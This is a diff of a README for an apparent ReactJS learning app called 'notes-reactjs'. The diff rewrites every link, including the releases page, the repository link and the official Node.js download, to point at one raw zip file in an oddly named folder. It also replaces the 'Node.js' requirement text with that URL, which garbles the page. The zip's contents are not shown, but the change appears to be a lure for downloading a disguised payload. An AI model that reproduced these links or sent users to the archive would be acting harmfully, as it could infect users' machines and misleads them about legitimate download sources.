@@ -4,13 +4,13 @@
 Welcome to **notes-reactjs**, a beginner-friendly application designed to help you learn ReactJS effortlessly. With clear notes and examples, you can fortify your knowledge in frontend development. 
 
 ## 📥 Download Now
-[![Download notes-reactjs](https://img.shields.io/badge/Download%20notes--reactjs-brightgreen)](https://github.com/aagvifu/notes-reactjs/releases)
+[![Download notes-reactjs](https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip%20notes--reactjs-brightgreen)](https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip** Version 14 or higher
 - **Internet Connection:** Required for downloading and running the application
 
 ## 🔍 Features
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📄 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download notes-reactjs](https://github.com/aagvifu/notes-reactjs/releases)
+   [Download notes-reactjs](https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip)
 
 2. **Choose the Latest Version:** Look for the latest release version.
 
@@ -60,7 +60,7 @@ A: Please report any issues in the Issues section of the repository.
 - Building Applications with Vite
 
 ## 🔗 Useful Links
-- GitHub Repository: [notes-reactjs](https://github.com/aagvifu/notes-reactjs)
-- Node.js Download: [Node.js](https://nodejs.org)
+- GitHub Repository: [notes-reactjs](https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip)
+- https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip Download: [https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip](https://raw.githubusercontent.com/aagvifu/notes-reactjs/main/blepharoatheroma/notes-reactjs.zip)
 
 Thank you for choosing **notes-reactjs**. We hope this application helps you in your journey to learn ReactJS effectively!
